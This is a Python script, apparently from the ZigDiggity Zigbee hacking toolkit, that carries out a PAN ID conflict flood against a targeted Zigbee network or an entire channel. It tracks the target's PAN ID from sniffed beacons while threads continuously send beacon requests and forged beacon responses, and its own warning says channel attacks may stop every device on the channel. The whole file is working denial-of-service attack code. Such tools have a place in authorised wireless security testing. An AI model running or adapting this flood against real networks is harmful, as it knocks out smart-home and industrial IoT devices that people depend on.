#!/usr/bin/python

from zigdiggity.interface.main import start_and_get_targets
from zigdiggity.datastore import database_session
from zigdiggity.datastore.networks import Network
import zigdiggity.utils.packets as packets
from zigdiggity.interface.colors import *
from threading import Event
import threading
import signal
import time

DEBUG = 1

def spot_pan_ids(listener, datasource, channel, attack_type, target_epan, target_pan):
    
    current_pan = target_pan

    while not stop_threads.isSet():
        packet = listener.recv()
        if not packet is None:
            if attack_type == 'network' and not target_epan is None:
                # Analyze Beacons to tell what the new PAN is
                candidate_epan = str(packets.get_extended_pan(packet))
                if not candidate_epan is None and candidate_epan == target_epan:
                    candidate_pan = packets.get_pan_id(packet)
                    if not candidate_pan is None and current_pan != candidate_pan and candidate_pan != 0xffff:
                        Color.pl("{.} New PAN id ovserved, now targeting PAN %s"%("0x%04x"%candidate_pan))
                        current_pan = candidate_pan
                        threading.pan = candidate_pan
            elif attack_type == 'channel':
                candidate_pan = packets.get_pan_id(packet)
                if not candidate_pan is None and current_pan != candidate_pan and candidate_pan != 0xffff:
                    Color.pl("{.} New PAN id ovserved, now targeting PAN %s"%("0x%04x"%candidate_pan))
                    current_pan = candidate_pan
                    threading.pan = candidate_pan

def send_pan_conflicts(sender, attack_type):

    while not stop_threads.isSet():
        sender.send(packets.beacon_request())
        sender.send(packets.beacon_response(threading.pan))

def handle_interrupt(signal, frame):
    stop_threads.set()
    time.sleep(1)
    exit(1)

if __name__ == '__main__':
    init_info = start_and_get_targets(database_session)

    sender = init_info['sender']
    listener = init_info['listener']
    target_type = init_info['target']['target_type']

    if target_type == 'channel':
        channel_target = init_info['target']['channel']
        channel = channel_target
        Color.pl("{!} Targeting the channel may cause any device on the channel to stop working.")
        raw_confirm = Color.prompt("{!} Are you sure you'd like to continue with the attack? ({G}Y{W}/{G}N{W}) [default: {G}N{W}]:")
        
        target_pan = None
        target_epan = None

        if len(raw_confirm) > 0 and raw_confirm.lower() == "y":
            pass
        else:
            exit(1)
    elif target_type == 'network':
        network_target = init_info['target']['network']
        channel = network_target.channel
        target_epan = network_target.extended_pan_id
        if target_epan is None:
            
            # need to find the epan to perform the network attack
            target_pan = network_target.pan_id
            if target_pan is None:
                Color.pl("{!} Cannot target a network without a PAN or extended PAN.")
                exit(1)
            
            network = database_session.query(Network).filter_by(pan_id=target_pan).first()
            if not network is None:
                target_epan = network.extended_pan_id
            else:
                Color.pl("{!} Cannot find the extended PAN associated with the target.")
                exit(1)

        else:
            target_pan = network_target.pan_id

    elif target_type == 'device':
        Color.pl("{!} PAN ID conflict attacks need to target networks.")
        Color.pl("{!} Please provide a network or channel to target.")
        exit(1)

    threading.pan = target_pan

    listener.set_channel(channel)
    sender.set_channel(channel)

    global stop_threads 
    stop_threads = Event()

    listen_thread = threading.Thread(target=spot_pan_ids, args=(listener, database_session, channel, target_type, target_epan, target_pan))
    send_thread = threading.Thread(target=send_pan_conflicts, args=(sender, target_type))

    listen_thread.daemon = True
    send_thread.daemon = True

    Color.pl("{+} Starting PAN Conflict Flood.")

    send_thread.start()
    listen_thread.start()

    signal.signal(signal.SIGINT, handle_interrupt)

    while not stop_threads.isSet():
        try:
            send_thread.join(timeout=1)
        except KeyboardInterrupt:
            stop_threads.set() 

